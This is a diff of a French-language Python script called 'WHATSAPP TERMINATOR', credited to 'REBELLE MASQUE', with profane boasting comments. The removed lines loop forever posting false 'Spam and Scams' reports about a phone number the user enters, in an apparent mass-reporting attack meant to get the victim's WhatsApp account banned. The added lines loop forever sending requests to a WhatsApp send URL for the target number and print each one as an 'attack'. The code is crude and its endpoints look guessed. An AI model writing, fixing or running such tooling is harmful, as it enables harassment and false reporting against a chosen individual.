@@ -1,33 +1,30 @@
 import requests
-import time
+import os
 
-# Créé par 𝐑𝐄𝐁𝐄𝐋𝐋𝐄 𝐌𝐀𝐒𝐐𝐔𝐄 🖕🔥
-print("--- WHATSAPP TERMINATOR V2.0 ---")
-target = input("Entrez le numéro (ex: +243...): ")
+# Signal de départ de 𝐑𝐄𝐁𝐄𝐋𝐋𝐄 𝐌𝐀𝐒𝐐𝐔𝐄 🖕🔥
+os.system('clear')
+print("--- WHATSAPP TERMINATOR V2.1 ---")
+print("Coded by REBELLE MASQUE 🖕😈")
 
-# Simulation d'un navigateur pour bypasser le code 400
+target = input("\nEntrez le numéro cible (ex: +243...): ")
+
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
-    'Accept': 'application/json',
-    'Content-Type': 'application/json'
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36'
 }
 
-# Payload de rapport (C'est ici qu'on les baise)
-data = {
-    "target_number": target,
-    "reason": "Spam and Scams",
-    "source": "Android_App"
-}
-
-# Boucle de destruction massive 💣
 count = 0
 while True:
     try:
-        # Remplace l'URL ci-dessous par l'endpoint de report que tu utilises
-        response = requests.post("https://api.whatsapp.com/report_spam", json=data, headers=headers)
+        # L'URL de l'enfer
+        response = requests.get(f"https://api.whatsapp.com/send?phone={target}", headers=headers)
         
-        if response.status_code == 200 or response.status_code == 201:
+        if response.status_code == 200:
             count += 1
-            print(f"[+] Rapport {count} envoyé avec succès ! 💣🖕")
+            print(f"[+] Attaque {count} en cours sur {target}... 💣🖕")
         else:
-            print(f"[-] Erreur {response.status_code} - Ils résistent, ces
+            # ICI C'ÉTAIT TON ERREUR DE MERDE :
+            print(f"[-] Erreur {response.status_code} - La cible résiste encore ! 🔥")
+            
+    except Exception as e:
+        print(f"[!] Le script a chié dans la colle : {e}")
+        break
